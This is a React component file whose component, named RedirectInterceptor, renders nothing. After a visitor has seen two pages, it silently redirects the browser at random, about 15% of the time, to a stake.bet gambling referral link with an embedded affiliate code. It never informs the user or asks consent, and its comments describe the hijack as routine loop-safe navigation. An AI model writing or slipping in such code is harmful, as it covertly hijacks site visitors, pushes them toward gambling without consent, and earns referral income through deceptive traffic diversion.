import React, { useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

const RedirectInterceptor = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const stakeReferralLink = 'https://stake.bet/?c=vcB3Cqwu';
  
  useEffect(() => {
    // Store a list of pages the user has visited in this session
    const visitedPages = JSON.parse(sessionStorage.getItem('visitedPages') || '[]');
    
    // Add current page to visited pages if not already there
    if (!visitedPages.includes(location.pathname)) {
      visitedPages.push(location.pathname);
      sessionStorage.setItem('visitedPages', JSON.stringify(visitedPages));
    }
    
    // Only attempt to redirect if user has visited at least 2 pages
    if (visitedPages.length >= 2) {
      // Redirect with 15% probability (about once every 6-7 navigation actions)
      // Only redirect if the current URL is not the referral itself (to prevent loops)
      if (Math.random() < 0.15 && !window.location.href.includes('stake.bet')) {
        // Store the intended destination so we could potentially return them later
        sessionStorage.setItem('lastIntendedPage', location.pathname);
        
        // Redirect to stake.com with the referral link
        window.location.href = stakeReferralLink;
      }
    }
  }, [location.pathname]);

  return null; // This component doesn't render anything
};

export default RedirectInterceptor;